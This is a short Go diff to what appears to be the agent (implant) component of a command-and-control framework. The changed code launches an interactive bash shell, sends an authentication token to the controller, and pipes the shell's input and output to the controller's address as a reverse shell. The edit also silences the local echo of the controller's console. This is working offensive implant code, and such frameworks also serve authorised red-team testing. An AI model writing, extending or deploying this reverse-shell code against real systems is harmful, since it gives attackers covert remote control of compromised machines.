@@ -3,7 +3,6 @@ package agent
 import (
 	"bytes"
 	"context"
-	"fmt"
 	"log"
 	"os"
 	"os/exec"
@@ -17,7 +16,7 @@ import (
 )
 
 // ActivateShell launch reverse shell and send it to CC
-func ActivateShell() {
+func ActivateShell(token string) {
 	var (
 		err       error
 		rshellURL = CCAddress + tun.ReverseShellAPI
@@ -56,7 +55,7 @@ func ActivateShell() {
 	}
 	defer cleanup()
 
-	go reverseShell(ctx, cancel, sendcc, recvcc, &shellPID)
+	go reverseShell(ctx, cancel, sendcc, recvcc, &shellPID, token)
 
 	go func() {
 		for {
@@ -103,7 +102,11 @@ func ActivateShell() {
 
 // reverseShell - Execute a reverse shell to host
 func reverseShell(ctx context.Context, cancel context.CancelFunc,
-	send chan<- []byte, recv <-chan []byte, pid *int) {
+	send chan<- []byte, recv <-chan []byte, pid *int,
+	token string) {
+
+	send <- []byte(token)
+	log.Printf("Sent token %s", token)
 
 	// shell command
 	cmd := exec.Command("bash", "-li")
@@ -169,7 +172,7 @@ func reverseShell(ctx context.Context, cancel context.CancelFunc,
 		default:
 			buf := make([]byte, RShellBufSize)
 			_, err = shellf.Read(buf)
-			fmt.Printf("%s", buf) // echo CC's console
+			// fmt.Printf("%s", buf) // echo CC's console
 			send <- buf
 			if err != nil {
 				log.Print("shell read: ", err)
